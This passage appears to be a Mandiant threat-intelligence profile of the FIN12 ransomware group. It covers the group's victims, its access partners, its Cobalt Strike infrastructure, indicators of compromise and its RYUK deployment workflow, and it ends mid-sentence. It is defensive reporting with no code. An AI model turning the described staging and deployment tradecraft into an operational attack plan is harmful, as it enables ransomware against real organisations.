Executive Summary
REPORT  |  MANDIANT  FIN12 Group Profile: FIN12 Prioritizes Speed to Deploy Ransomware Against High-Value Targets
5
FIN12 is a financially motivated threat group behind prolific ransomware attacks dating 
to at least October 2018 that primarily involve the deployment of RYUK ransomware. Our 
definition of FIN12 is limited to the tactics, techniques, and procedures (TTPs) used in 
the post-compromise deployment of ransomware given we have high confidence that 
FIN12 relies on partners to obtain initial access to victim environments. Notably, instead 
of conducting multifaceted extortion, a tactic widely adopted by other ransomware 
threat actors, FIN12 appears to prioritize speed and higher revenue victims. The lack of 
large-scale data exfiltration in FIN12 incidents has almost certainly contributed to their 
high cadence of operations, with FIN12 intrusions making up nearly 20 percent of our 
ransomware incident response engagements since September 2020. 
•	 Since initially emerging, FIN12 has had a close partnership with TRICKBOT-affiliated 
threat actors; all incidents prior to March 2020 leveraged accesses obtained from 
TRICKBOT infections. However, FIN12 has seemingly diversified its partnerships, 
possibly seeking out other threat actors' tools and services to increase the volume and 
efficiency of their attacks. 
•	 In nearly every single FIN12 intrusion since February 2020, FIN12 has used Cobalt Strike 
BEACON payloads to interact with victim networks, progressing through their attacks 
from internal reconnaissance to ransomware deployment. In the years prior, however, 
they had used a broader toolset to serve the same functions, including the PowerShell-
based EMPIRE framework, and in their earliest intrusions even using the TRICKBOT 
banking trojan as a post-exploitation framework alongside EMPIRE.
•	 While FIN12 appears to rely on close partnerships for obtaining initial access to 
organizations, they almost certainly have some input into victim selection. Victims' 
annual revenues are typically greater than $300 million USD and unlike other 
ransomware threat actors, they have frequently targeted organizations in the 
healthcare sector. We believe that FIN12's partners cast a wider net and allow FIN12 
actors to choose from a list of victims after accesses are already obtained.

Victimology
We believe that FIN12's victim selection is primarily driven by an organization's geolocation and annual revenue. Almost 85 percent of 
observed victim organizations have been based in North America and the vast majority of known FIN12 victims have more than $300 
million USD in revenue. The threat group has impacted organizations in a broad range of industries; however, unlike most ransomware 
threat actors, FIN12 has repeatedly targeted healthcare organizations.

Revenue 
The average annual revenue of observed FIN12 victim 
organizations was more than $6 billion USD and almost all the 
organizations made more than $300 million USD, based on 
data compiled from ZoomInfo. This number could be inflated 
by a few extreme outliers and collection bias; however, FIN12 
generally appears to target larger organizations than the average 
ransomware affiliate. Various threat actors, including those using 
RYUK, have specified minimum requirements for victim's annual 
revenues illustrating that it is a factor considered when choosing 
targets. Some threat actors almost certainly target organizations 
with higher revenues because of the perception that it justifies 
large ransom demands; for example, actors have claimed to 
calculate the initial demand as a percentage of annual revenue.
•	 According to trusted, sensitive sources, multiple actors 
claiming to use RYUK ransomware have specified minimum 
revenue requirements—ranging from $5 – $50 million USD 
(21-00019652). 
•	 In numerous RYUK negotiations, including one associated with 
a 2019 intrusion that we attribute to FIN12, the threat actors 
included the victim organization's revenue and number of 
employees in their communications, presumably to justify the 
demanded ransom.
	– It is unclear if this was an effective negotiation tactic, 
given that victims argued that the revenue data was incorrect, 
that revenue was distinct from profitability, or that the value 
of the lost data was not proportional to the ransom demand. 
This tactic may have been particularly less effective in 
2020–2021, given that many companies saw reduced revenues 
due to the COVID-19 pandemic.
Geolocation
FIN12 victim organizations have been overwhelmingly located 
in North America; however, there is some evidence that FIN12's 
regional targeting has been expanding. While approximately 
71 percent of victims have been based in the United States and 
approximately 12 percent of victim organizations were located in 
Canada, we observed about twice as many victim organizations 
based outside of North America in the first half of 2021 than we 
observed from 2019 to 2020. Collectively, these organizations 
have been based in Australia, Colombia, France, Indonesia, 
Ireland, the Philippines, South Korea, Spain, the United Arab 
Emirates, and the United Kingdom.
Industry
FIN12 targeting appears to be relatively industry agnostic but the 
group has disproportionately impacted healthcare organizations 
even in the midst of the COVID-19 pandemic. Almost 20 percent 
of observed victims have been in the healthcare industry and 
many of these organizations operate healthcare facilities. The 
remaining victims have operated in a broad range of sectors, 
including but not limited to business services, education, 
financial, government, manufacturing, retail, and technology.
•	 FIN12 continued targeting healthcare entities during the 
COVID-19 pandemic, unlike many other ransomware groups, 
as ransomware-as-a-service (RaaS) operators often prohibit 
affiliates from targeting hospitals. Given that many actors 
refuse to target this industry, it may also be easier or cheaper 
to obtain access to healthcare organizations. However, by 
targeting healthcare facilities, FIN12 may face increased 
scrutiny from law enforcement agencies as well as potential 
partners that wish to limit public exposure.
•	 While many threat actors prohibit targeting of hospitals, others 
likely target healthcare facilities because they believe that 
these organizations are more likely to pay ransom demands. 
For example, in September 2020, the Exploit[.]in user 
"farnetwork"—who has claimed to previously use RYUK and 
MAZE ransomware—sought access to medical/pharmaceutical 
organizations in the United States because they believed that 
medical organizations paid well.

Initial Accesses
Throughout FIN12's lifespan, we have high confidence that the 
group has relied upon multiple different threat clusters for 
malware distribution and the initial compromise stage of their 
operations. FIN12 has likely established close partnerships with 
these initial access providers; in most of the incidents where 
the initial intrusion was identified, FIN12 activity was observed 
on the same day as the initial access campaign. Most notably, 
FIN12 shares a close working relationship with the operators of 
TRICKBOT and BAZARLOADER. Beyond leveraging accesses 
obtained via these malware families, FIN12 has used overlapping 
toolsets and services including backdoors, droppers, and 
codesigning certificates (Appendix 1). Despite these overlaps, 
we track FIN12 as a distinct threat actor given their specific role 
in the deployment of ransomware, their demonstrated ability to 
work independently of these families, and our observations of 
other distinct threat actors who deploy ransomware also working 
with TRICKBOT-affiliated actors.

TRICKBOT
Across all Mandiant engagements attributed to FIN12 between 
October 2018 and March 2020, the initial intrusion vector 
either included or was suspected to include TRICKBOT. 
FIN12 continued to leverage TRICKBOT-obtained accesses 
sporadically through 2021. We believe that FIN12 may choose 
victims of interest through a TRICKBOT administration panel, 
which allows affiliated actors to control and interact with victim 
machines. The long-term use of TRICKBOT for access spanning 
across seemingly disparate TRICKBOT affiliates suggests a 
close working relationship between FIN12 and the owners of 
TRICKBOT. In addition to the use of TRICKBOT for initial access, 
we have observed other technical overlaps between these 
groups that further demonstrate this relationship.
•	 We have identified evidence of FIN12 intrusion activity following 
TRICKBOT infections spanning more than 50 unique root gtags. 
Each root gtag is believed to represent a unique TRICKBOT 
affiliate or module, although some affiliates are associated 
with multiple gtags. For example, the TRICKBOT mor* gtag has 
typically been distributed as a secondary payload to EMOTET. 
Additionally, we have commonly observed certain gtags, 
including lib*, jim*, tot* used in FIN12 operations, which are 
associated with TRICKBOT's lateral movement modules, rather 
than specific TRICKBOT affiliates. 
•	 The operators of TRICKBOT and their affiliates use various 
panels to manage their operations, such as a panel for webinject 
management and multiple administration panels used to interact 
with victim machines (19-00017069). Actors with access to these 
panels have different roles and privileges that allow them to view 
sets of victims, associated comments, and statuses. 
UNC2053
After a break in FIN12 activity from late March 2020 to late August 
2020, FIN12 resumed operations shifting their reliance for 
initial access away from TRICKBOT to BAZARLOADER malware 
in September 2020. We track the use of BAZARLOADER and 
BAZARBACKDOOR as UNC2053. Infections from these malware 
families are also managed through an administration panel from 
which FIN12 could also possibly select their desired victims. 
Notably, there are also numerous overlaps between UNC2053 
and TRICKBOT, including the use of common infrastructure, code 
signing certificates, droppers, and overlaps in distribution TTPs; 
we believe that they were likely developed under the direction of 
common threat actors (20-00007310). 
•	 In instances where FIN12 leveraged UNC2053 for initial 
access, we observed BAZARLOADER payloads distributed via 
malicious email campaigns. These loaders then downloaded 
a corresponding BAZARBACKDOOR payload that was used to 
subsequently deliver a FIN12 BEACON payload. 
•	 BAZARLOADER and BAZARBACKDOOR infections have been 
managed through a panel dubbed “Botleggers Club.” Users 
can see bots and associated information based on assigned 
groups, which appear to in at least some cases correspond to 
different variants of BAZARLOADER and BAZARBACKDOOR. 
The comment field has contained the victim organization and/or 
its annual revenues illustrating its relevance in deciding which 
targets to further exploit. 
UNC2600
In early February 2021, we observed FIN12-attributed BEACON 
payloads distributed directly through malicious email campaigns; 
the distribution of these payloads is tracked by Mandiant as 
UNC2600. The TTPs used to distribute BEACON have significant 
overlaps with UNC2053 distribution campaigns observed 
between March 2020 and February 2021, including similar lure 
themes, phishing emails that contain links to malicious PDFs 
hosted on Google Documents, and the use of legitimate web 
services for payload hosting. This indicates that they were 
distributed by a common spammer, but given the distribution of 
non-BAZARLOADER payloads, we currently track this activity 
separately from UNC2053. 
Internal Phishing Activity
In two separate FIN12 intrusions during May 2021, a threat 
actor obtained a foothold in the environment through malicious 
email campaigns distributed internally from compromised user 
accounts. In both incidents, the threat actor used compromised 
credentials to access the victims' Microsoft 365 environment to 
distribute the malicious emails via Outlook on the Web. While the 
distribution TTPs varied, both campaigns led to WEIRDLOOP and 
BEACON payloads attributed to FIN12.
•	 In one intrusion, a threat cluster distributed internal phishing 
emails that contained a malicious Excel attachment which 
used an ETTERCELL macro downloader to retrieve a copy of 
Remote Utilities remote access software. After gaining this 
initial foothold, a FIN12 WEIRDLOOP payload was deployed to 
drop BEACON.
•	 During a second incident, a separate threat cluster distributed 
internal phishing emails, which included a link to a Google 
Documents phishing document. This document contained a link 
that when clicked downloaded a malicious Word document. The 
initial payload delivered by this document was not recovered, 
but we observed FIN12 WEIRDLOOP and BEACON in the 
environment approximately two hours later.

10
Access Via Remote Logins
In at least four FIN12 intrusions between mid-February and mid-
April 2021, the first evidence of threat actor activity was logins to 
victims' Citrix environments. We have not confirmed how FIN12 
obtained these credentials. However, it is plausible that the threat 
actors leveraged accesses purchased in underground forums. 
Mandiant identified multiple threat actors who claim to use 
RYUK seeking to buy accesses to victim environments, although 
we currently lack sufficient evidence to attribute these actors 
to FIN12. Notably, two of these threat actors—"diego033" and 
"WATech"—sought Citrix accesses in the first half of 2021, which 
is consistent with the timeframe that we began to observe the 
aforementioned FIN12 activity.  
•	 On May 25, 2021, "diego033" posted on exploit[.]in seeking 
suppliers of various forms of network accesses, including Citrix, 
RDP, VPN, and bots.
•	 On Feb. 17, 2021, actor "WATech" posted on exploit[.]in seeking to 
buy Citrix and RDP accesses to corporate networks.
JavaScript Downloaders
Through the analysis of FireEye product telemetry, in November 
2020 we identified malicious emails that contained links to 
ZIP archives hosted on Google Drive containing JavaScript 
downloaders that in some cases ultimately resulted in the delivery 
of FIN12 BEACON payloads. This same distribution channel was 
used to deliver TRICKBOT with the "tar" gtag. Notably, during this 
same month, we also identified instances of TRICKBOT using 
the "tar" gtag instructing a bot to download a FIN12-attributed 
BEACON payload. These overlaps may indicate that a common 
threat actor, affiliated with TRICKBOT, is behind both campaigns. 
Additionally, we identified cases in this same time frame where 
the TRICKBOT samples associated with the "tar" gtag distributed 
BEACON payloads that looked distinct from those commonly used 
by FIN12, or that we have insufficient evidence to attribute to the 
group. This supports the possibility that the actor behind this 
operation is providing access to multiple threat actors.
FIN12 Evolution of Post Compromise TTPs
Despite clear patterns across their intrusions, FIN12's post-
compromise TTPs have evolved over time. This type of slow 
evolution is to be expected of any threat group that maintains 
operational coherence during a period of months or years. 
These shifts are likely due to various intersecting factors such 
as the threat actors learning more about their craft, developing 
new tools and community relationships, or changes in a threat 
group's membership over time. Some of the most important 
developments in FIN12's post-compromise TTPs have included 
changes in the way they've relied on TRICKBOT, patterns in their 
use of post-exploitation frameworks, and the ways in which 
they've obfuscated their BEACON payloads.
•	 TRICKBOT was identified or suspected of being the initial 
foothold for the vast majority of FIN12 intrusions between 
2018 and early 2020. Initially, TRICKBOT was used to enable 
early stages of the attack lifecycle eventually leading to the 
deployment of a post-exploitation framework, whereas over 
time it began to be used more exclusively to provide a foothold 
into victim networks.
•	 The PowerShell-based EMPIRE post-exploitation framework 
was used by FIN12 nearly exclusively until mid-2019 when they 
began to also use Cobalt Strike (BEACON), and intermittently 
Metasploit (METERPRETER). The group nearly abandoned use of 
EMPIRE in early 2020 and has increasingly relied on BEACON to 
perform most of their post-exploitation activities.
•	 Notably, in the period following FIN12's hiatus in 2020, the 
group experimented with the use of other post-exploitation 
tools including Covenant (GRUNT), GRIMAGENT, and ANCHOR, 
although by November 2020 they reverted to relying primarily on 
BEACON.
•	 Malware payloads used by FIN12 have been packaged using 
a shifting set of in-memory droppers including ICECANDLE, 
MALTSHAKE, WEIRDLOOP, WHITEDAGGER, and templates 
associated with Cobalt Strike's Artifact Kit.

11
TRICKBOT as Post-Exploitation Tool
Throughout 2018 and early 2019, post-exploitation activity 
at intrusions where FIN12 later deployed RYUK was primarily 
enabled via TRICKBOT. There are various TRICKBOT modules that 
provide capabilities allowing attackers to progress through the 
attack lifecycle, including modules that enable host and network 
reconnaissance, lateral movement, and privilege escalation. In 
many early FIN12 intrusions, TRICKBOT was used to progress 
through early phases of the attack lifecycle, and we only observed 
a pivot to the use of FIN12-attributed EMPIRE or Metasploit 
payloads as these incidents approached their later phases. We 
suspect that in most or all cases these secondary payloads were 
deployed via TRICKBOT as a means of handoff between teams or 
individual operators and used by FIN12 to maintain a foothold in the 
environment while performing latter-stage tasks, such as further 
Active Directory reconnaissance, RYUK staging, and deployment. 
•	 We do not currently have sufficient evidence to attribute 
the use of TRICKBOT to FIN12 beyond leveraging it to deliver 
malware that was later used in their operations. FIN12 was 
possibly provided at least some level of access or visibility to 
TRICKBOT through its administration panels. This arrangement 
has been observed with other threat actors deploying 
ransomware (21-00013852). It is also plausible that one or more 
TRICKBOT operators or affiliates may have played a larger role 
in these early intrusions, such as performing at least some 
reconnaissance, lateral movement, and privilege escalation 
tasks prior to handing over access to FIN12.
•	 Table 1 contains a listing of TRICKBOT modules observed during 
FIN12 intrusion activity that have functionality relevant to 
their operations. In addition to these modules, we commonly 
observed the use of TRICKBOT modules that were unlikely to 
support post-exploitation. Those modules were likely deployed 
either in batches with other modules or as a result of default 
TRICKBOT module configurations.

Shift from EMPIRE to Cobalt Strike
Beginning in late 2019, FIN12 appeared to reduce their reliance on 
TRICKBOT and began to use publicly available tools for the post-
compromise stages of their intrusions, although the specific tools 
have sometimes varied between intrusions. Initially, FIN12 appeared 
to favor EMPIRE, but in incidents since early 2020, FIN12 has 
overwhelmingly relied on Cobalt Strike BEACON. In 2020, FIN12 also 
sporadically deployed other backdoors in addition to BEACON. The 
limited time frame of their use could suggest that FIN12 was testing 
the efficacy of new toolsets before settling on Cobalt Strike. 
•	 In early operations and through 2019, FIN12 primarily 
leveraged EMPIRE to maintain a foothold in victim 
environments. In these early intrusions, EMPIRE was typically 
deployed following the use of TRICKBOT and its modules for 
earlier stages of the attack lifecycle.
•	 FIN12 continued to use EMPIRE in operations from 
November 2019 to February 2020 to manage intrusions 
while incorporating public tools for reconnaissance, lateral 
movement, and privilege escalation tasks. 
•	 Following a period of overlapping EMPIRE and Cobalt Strike use 
between September 2019 and February 2021, FIN12 shifted to 
using Cobalt Strike as their primary intrusion framework. We 
have observed FIN12 use EMPIRE on at least one occasion in 
2021, but the threat actors have relied upon Cobalt Strike almost 
exclusively for their intrusions since early 2020.
•	 FIN12 also leveraged other backdoors including ANCHOR, 
GRIMAGENT, GRUNT, and METERPRETER in the latter half of 
2020 (Figure 4). The use of each of these tools has been very 
limited and primarily occurred after the group's reemergence in 
September and October 2020. 
	– We observed ANCHOR deployed only once during a FIN12 
intrusion and it was used alongside Cobalt Strike. FIN12 has 
also leveraged GRIMAGENT and GRUNT in a limited number 
of intrusions in parallel to Cobalt Strike; however, the group 
ceased use of these tools after this time. 
In-Memory Droppers Changes
Since at least February 2020, FIN12 has leveraged a series of 
in-memory droppers including, MALTSHAKE, ICECANDLE, 
WHITEDAGGER, WEIRDLOOP, and templates associated with 
Cobalt Strike's Artifact Kit to deploy various malware payloads. 
These frequent changes in their dropper usage may be an effort 
to continually avoid detection over time and/or reflective of 
leveraging distinct threat actors who provide crypting services to 
a small number of clients.
•	 During February 2020, we observed FIN12 SYSTEMBC and RYUK 
payloads being dropped by MALTSHAKE during later stages of 
their intrusions.
•	 Following FIN12's return from hiatus in September 2020, 
we observed similar droppers, including ICECANDLE and 
WHITEDAGGER, used to primarily deliver FIN12 BEACON 
payloads. FIN12-attributed RYUK and SYSTEMBC payloads were 
also dropped by ICECANDLE and WHITEDAGGER during this time.

have been used with malware families that we have no evidence 
to suggest are used by FIN12. However, droppers including 
MALTSHAKE, ICECANDLE, and WEIRDLOOP have been used by 
actors that also have known associations to FIN12.

Cobalt Strike / BEACON TTPs
While Cobalt Strike is used by many threat actors, there are 
several distinct characteristics associated with FIN12's use 
of Cobalt Strike and BEACON that have allowed for tracking of 
their payloads and infrastructure. These characteristics include 
patterns in their use of malleable C&C profiles, network-based 
TTPs including infrastructure and configuration preferences, and 
host-based TTPs such as filenames, paths, and certificate usage.
Cobalt Strike / Malleable C&C Profiles 
FIN12 has used several publicly available malleable C&C profiles 
and at least one malleable C&C profile generator to help disguise 
BEACON C&C traffic. Their usage of various profiles has shifted 
over time, but recent campaigns have consistently leveraged the 
FortyNorth Security C2Concealer malleable profile generator. As 
a result, several of their current BEACON TTPs are related to the 
use of this profile generator. 
•	 In February and March 2020, we frequently observed FIN12 use 
the common, publicly available Amazon malleable C&C profile.
•	 After their mid-2020 hiatus, FIN12 began using the FortyNorth 
Security C2Concealer malleable C&C profile generator, which 
they have used regularly since September 2020.
•	 In a limited number of cases, we have observed the group using 
the publicly available jQuery, Google Web Bug, GoToMeeting, and 
MSNBC-themed profiles.
	– The Google Web Bug and MSNBC profiles were observed in 
January and February 2020 before FIN12 switched to use 
of the Amazon profile. These were among the first profiles 
we observed the group using and may represent their initial 
experimentation with malleable C&C profile usage.
	– The GoToMeeting and jQuery profiles were observed in 
August 2020 and September 2020 after the group resumed 
activity following their mid-2020 hiatus. This may represent 
an attempt to vary their techniques to avoid detection and 
attribution following their time off.
Cobalt Strike / Watermarks 
FIN12 has also used a limited number of BEACON watermarks; in 
all cases, these watermarks have also been used by other threat 
actor groups. The watermark, or customer ID, is a 4-byte number 
from the cobaltstrike.auth file located on a team server. This 
number is associated with the customer's Cobalt Strike license 
key. The trial version of Cobalt Strike uses the 0x0 watermark, and 
watermarks that otherwise appear non-random are not likely to 
be associated with valid license keys. The following watermarks 
have been used by FIN12, in descending order of frequency:
•	 0x00000000
•	 0x12345678
•	 0x5109bf6d
•	 0x86782e5e
•	 0x00000003
•	 0x01000000
Cobalt Strike / BEACON Network TTPs
FIN12 BEACON payloads have used distinct but evolving TTPs 
for hosting, domain registration, FQDN themes, port usage, TLS/SSL 
certificates, URL paths, and HTML error pages. Prior to the group's 
mid-2020 hiatus their BEACON payloads used common malleable 
C&C profiles (most frequently an Amazon-themed profile), and their 
C&C servers were configured to use Let's Encrypt SSL certificates. 
However, these characteristics changed dramatically upon their 
return, in large part due to their adoption of the FortyNorth Security 
C2Concealer Cobalt Strike profile generator.
Although Mandiant has observed relative uniformity in the 
Cobalt Strike infrastructure used by FIN12 since returning 
from their hiatus in mid-2020, there were smaller shifts in their 
infrastructure TTPs. In March 2021, FIN12 began to use Cloudflare 
to obscure the location of their Cobalt Strike servers and started 
filtering HTTP requests for payloads requiring that they be using 
the user-agent "WOW64.1".
Historically, there are general trends that have persisted across 
REPORT  |  MANDIANT  FIN12 Group Profile: FIN12 Prioritizes Speed to Deploy Ransomware Against High-Value Targets
14
FIN12's use of domains and hosting providers including repeated 
use of common ISPs and domain registrars.
•	 As FIN12 shifted from EMPIRE to Cobalt Strike in early 2020, 
the group has continued to host a significant proportion of the 
C&C infrastructure in the networks of Choopa, a U.S.-based VPS 
hosting provider, a trend that has continued through 2021. Other 
hosting providers commonly used by FIN12 have included:
	– Combahton GmbH
	– FranTech Solutions
	– Informacines Sistemos Ir Technologijos
	– Leaseweb, Liteserver Holding B.V.
	– Nexeon Technologies
	– Psychz Networks
	– ReliableSite
•	 BEACON C&C domains used by FIN12 have most commonly 
been registered via NameCheap or Hosting Concepts B.V. d/b/a 
Openprovider, although they used Public Domain Registry for a 
short period in September and October 2020.
Many of the changes to Cobalt Strike infrastructure and BEACON 
configuration seen across FIN12 activity in the latter half of 
2020 and beyond can likely be attributed to their adoption of 
C2Concealer, including the adoption of self-signed certificates, 
semi-randomized malleable C&C profiles, identifiable error 
pages, and the use of two-character subdomains.
•	 Although FIN12 has continued to use Let's Encrypt SSL 
certificates intermittently, most of the certificates observed 
since September 2020 have been self-signed. These have often 
contained overlapping certificate subject elements as shown 
in Table 2. We believe these patterns are due to their use of 
C2Concealer, which allows users to generate a certificate by 
manually entering details on the command line. Notably, in early 
campaigns where we suspect FIN12 used C2Concealer, the 
certificates did not have an Organizational Unit (OU) field. This is 
consistent with C2Concealer's certificate generation function, 
which does not include an option to enter the OU field. Later 
self-signed certificates used in conjunction with C2Concealer 
contained an OU field suggesting that they may have been 
created outside of this tool.
•	 Cobalt Strike malleable C&C profiles used by FIN12 in the 
latter half of 2020 and beyond have incorporated URL paths 
built from lists of subdomains, directories, filenames, and file 
extensions. These lists are largely consistent with the default 
C2Concealer URL data lists, although FIN12 appears to have 
modified these lists occasionally, particularly the lists of 
subdomains and file extensions.
•	 FIN12 BEACON servers have delivered distinct HTML pages 
following their mid-2020 hiatus. These pages appear to be 
an artifact of C2Concealer usage based on their presence in 
the tool's source code. Figure 6 contains an example of one of 
these error pages.
Historical FIN12 Cobalt Strike server infrastructure and BEACON 
configurations looked fairly distinct from those seen in more 
recent activity. These prior operations used more common 
malleable C&C profiles, Let's Encrypt SSL certificates, and 
thematically similar domains.
•	 FIN12 frequently registered and used domains that 
masqueraded as IT security organizations and/or referenced 
related concepts.
•	 FIN12 frequently leveraged Let's Encrypt certificates for their 
BEACON infrastructure. 
•	 FIN12 BEACON payloads historically used common malleable 
C&C profiles, most frequently the publicly available Amazon 
malleable C&C profile.

FIGURE 6. Example HTML content returned from BEACON server.
Cobalt Strike / BEACON Host TTPs
FIN12 BEACON payloads have used distinct filenames, file 
paths, and demonstrated certificate usage overlaps with other 
malware families.
•	 FIN12 has commonly executed BEACON payloads from the C:\
PerfLogs\ directory with the default filename p64.exe or p32.
exe, depending on the architecture of the impacted system. We 
observed this pattern across FIN12 intrusions throughout most 
of 2020. Notably, we have observed other common filenames 
over shorter time spans including "smss," "wav," and "arti," a 
reference to Cobalt Strike's artifact kit.
•	 FIN12 has occasionally leveraged code-signed payloads in 
their operations, both before and after their mid-2020 hiatus. 
In some cases, these certificates were used to sign malware 
not attributed directly to FIN12. These have included families 
leveraged during their own intrusion operations such as RYUK 
and SYSTEMBC, as well as malware delivered by other groups 
that have been used by FIN12 for initial access. For example, we 
observed FIN12 BEACON payloads that shared code-signing 
certificates with BAZARLOADER and BAZARBACKDOOR variants 
KEGTAP, SINGLEMALT, BEERBOT, STILLBOT, and BUBBLYBOT.
GRIMAGENT
While most of the tools that FIN12 uses in their intrusions 
are publicly sourced or acquired through their relationships 
with other threat actors, we believe that GRIMAGENT may be 
exclusive to the group. FIN12 used the GRIMAGENT backdoor 
in multiple intrusions, with particular regularity in October 
2020. Trusted, sensitive sources indicate that GRIMAGENT 
C&C infrastructure is closely associated with a customer of the 
bulletproof hosting service offered and operated by the actor 
"yalishanda." This GRIMAGENT infrastructure has been co-located 
with other resources used by FIN12, including Cobalt Strike C&C 
infrastructure and RYUK victim contact pages.
•	 All known GRIMAGENT C&C domains are associated with the 
same customer of the bulletproof hosting service offered by 
yalishanda (19-00009302). While not all GRIMAGENT samples 
are currently attributed to a known threat actor, we have not 
attributed its use to any other threat actor. We also have not 
identified this malware being offered in underground forums.
•	 RYUK victim contact pages and BEACON payloads attributed 
to FIN12 have used the same infrastructure as GRIMAGENT 
C&C domains. The RYUK victim contact pages were eventually 
moved to other infrastructure operated and owned by 
yalishanda but associated with the same customer.
•	 We have observed a RYUK ransom note HTML page being 
displayed on GRIMAGENT C&C domains (Figure 7). The 
TOR payment domain embedded in this payment page was 
etnbhivw5fjqytbmvt2o6zle3avqn6rrugfc35kmcmedbbgqbxtknl 
qd[.]onion, which has been used in FIN12 intrusions (Figure 8).

16
FIGURE 7. RYUK ransom note HTML page on GRIMAGENT C&C domain.
FIGURE 8. TOR payment domain embedded in HTML.
FIN12 has sometimes used GRIMAGENT as a foothold in the environment earlier in intrusions, and in other cases it was used to maintain 
access to critical machines including domain controllers later in intrusions. FIN12 has staged GRIMAGENT in the C:\PerfLogs and C:\
Users\Public\Music directory and the files often masquerade as system files or installation scripts for common software:
•	 chrome.exe
•	 explorer.exe
•	 pagefile<random_alpha_chars>.exe
•	 swapfile<random_alpha_chars>.exe
•	 swchost.exe
•	 tmuninst<random_alpha_chars>.exe
•	 toolbox_client_uninst<random_alphanumeric>.exe

Use of Criminal Services
FIN12 has consistently relied on a small arsenal of tools, limited 
almost exclusively to malware in the TRICKBOT ecosystem and 
publicly available utilities or attack frameworks. Despite the 
overarching pattern, FIN12 has still intermittently used a variety 
of other malware and services possibly acquired from the 
criminal underground.
Malware
FIN12 commonly uses SYSTEMBC malware to proxy remote 
connections to hosts within victim environments. SYSTEMBC 
is sold publicly on Exploit[.]in by the Russian-speaking actor 
"psevdo" and has been leveraged by multiple disparate threat 
clusters (21-00007472).
Crypting (In-Memory Droppers)
FIN12 has leveraged various in-memory droppers to load malware 
payloads. At least some of these droppers appear to only be 
used by threat clusters and malware families that have known 
associations with FIN12, such as initial access providers. The 
integration of the publicly available DAVESHELL launcher into 
several related in-memory droppers may also suggest that at 
least some crypting services are provided by a common actor. 
While we have not identified these droppers for sale in public 
underground forums, it is also common for threat actors to offer 
tools or services privately to a smaller group of threat actors.
•	 FIN12 has used several in-memory droppers to load various 
payloads including BEACON, SYSTEMBC, and RYUK. These 
droppers also act as crypters, obfuscating the payload and 
complicating detection. We do not believe that these droppers 
are exclusive to FIN12. Further, trusted sensitive sources 
indicate that payloads using at least some of these droppers 
may be sourced from a shared partner that provides private 
crypting services for a limited set of actors. 
•	 Some of the droppers have been used with malware families 
that we have no evidence to suggest are used by FIN12; 
however, in some cases, these families are used by actors 
that have served as initial access providers for FIN12 (Table 3). 
Specifically, ICECANDLE, MALTSHAKE, and WHITEDAGGER 
have all been used to drop TRICKBOT payloads. We have 
identified numerous actors associated with TRICKBOT seeking 
crypters to enable their operations including Hostess, khano, 
and SpongeB. This further supports the possibility that at least 
some overlaps in dropper usage are due to a common threat 
actor providing these services.

Code Signing Certificates 
FIN12 has frequently leveraged code-signed payloads in their 
operations. Their code-signing certificates have been issued 
by common certificate authorities, including DigiCert, Sectigo 
(Comodo), and Certum. In several instances, these certificates 
contained common names associated with seemingly legitimate 
businesses, suggesting the organizations' information was used 
to fraudulently purchase certificates. While we have not linked 
any FIN12 certificates to specific vendors in criminal markets, it 
is plausible that FIN12 has obtained certificates from a criminal 
service provider. 
•	 FIN12 has used certificates and common names that have also 
been used to sign payloads attributed to other threat clusters. 
These overlaps across distinct clusters of activity may 
suggest that the certificates were procured from a common 
actor or service. 
	– A cluster of NETSUPPORT activity in August 2020 used 
payloads signed with a Sectigo certificate using the common 
name "Bespoke Software Solutions Limited."
	– In October 2020, FIN12 and UNC2053 used signed payloads 
with a certificate issued by DigiCert and also using the 
common name "Bespoke Software Solutions Limited."
Bulletproof Hosting
FIN12 has used bulletproof hosting services offered on Exploit[.]
in by an actor known as "yalishanda." This service was used for 
their GRIMAGENT C&C domains. Additionally, RYUK victim contact 
pages and BEACON payloads attributed to FIN12 have used the 
same bulletproof hosting infrastructure.

18
Monetization
After acquiring access to victim environments, FIN12 progresses 
relatively quickly to deploy ransomware. In M-Trends 2021, the 
median dwell time for all ransomware investigations was five days, 
whereas across FIN12 engagements it was less than two days. 
Notably, while FIN12's average time-to-ransom (TTR) is 3.97 (three 
days, 20 hours, 20 minutes), the threat actors have improved their 
speed year-over-year (Figure 9). Across these incidents, FIN12 
has almost exclusively deployed RYUK ransomware. However, in 
one instance, FIN12 deployed CONTI ransomware. In this incident, 
they also extorted the organization for the non-release of stolen 
data. Notably, while the majority of RYUK ransomware incidents 
that Mandiant has responded to are attributed to FIN12, we do not 
believe that the ransomware is exclusively used by these threat 
actors (21-00019652). FIN12 has used multiple, distinct TTPs related 
to their deployment of RYUK and CONTI, which helps to distinguish 
their activity, including the use of specific scripts, staging 
directories, and file naming conventions.

Ransomware Deployment Scripts
FIN12 has regularly made use of a set of scripts to copy ransomware 
to network hosts identified during internal reconnaissance and 
execute the ransomware on these hosts. During multiple incidents, 
there has been evidence that FIN12 stages a ZIP archive with the 
filename share$.zip in the C:\PerfLogs directory on a domain 
controller. This ZIP archive contains multiple files used to deploy 
ransomware across the network. Table 4 lists the typical names 
and functionality of these files and Figures 10–12 show example 
contents of the batch scripts.

FIGURE 12. Example EXE.bat script snippet.
FIGURE 13. Example WebDAV ransomware deployment command.
In at least one instance, we observed FIN12 use distinct batch 
scripts designed to perform the same copy and execute tasks 
using PowerShell. These scripts, named _CopyPS.bat and 
StartPS.bat, contain code that creates a network share, sets 
permissions for the share, copies a PowerShell script named 
RUN_task.ps1 and comps<##>.txt files, and executes RUN_task.
ps1 using the comps<##>.txt files as arguments. RUN_task.ps1 
creates a scheduled task that executes the ransomware payloads 
five minutes after scheduled task creation.
FIN12 makes regular use of the C:\share$ directory for staging 
of ransomware and related scripts. These threat actors have 
commonly, but not exclusively, used the filename xxx.exe for its 
ransomware payloads. In some earlier instances, FIN12 used the 
naming convention t<#>-<##>.exe and in other instances, have 
used other filenames with repeating characters, such as fff.exe, 
or seemingly random characters.
While the majority of FIN12 ransomware deployment has 
leveraged scripts like those described, we have observed 
various other methods, including manual deployment via RDP, 
self-propagation functionality built into a RYUK, and at least 
one instance where the group deployed ransomware using 
Group Policy Objects (GPOs) and Web Distributed Authoring and 
Versioning (WebDAV). These divergent deployment methods 
are interspersed throughout FIN12's known activity. These 
attempts have sometimes occurred in environments where the 
aforementioned deployment scripts were also observed. This 
suggests that, in some cases, FIN12 may use alternative methods 
when the scripts do not perform satisfactorily. 
•	 FIN12 has deployed RYUK manually via RDP in multiple intrusions. 
These incidents have included the following scenarios:
	– the ransomware was exclusively deployed via RDP, 
	– the deployment scripts were also present, but may not have 
been successful, 
	– after successfully using the deployment scripts, the threat 
actors used RDP to access and encrypt machines being used 
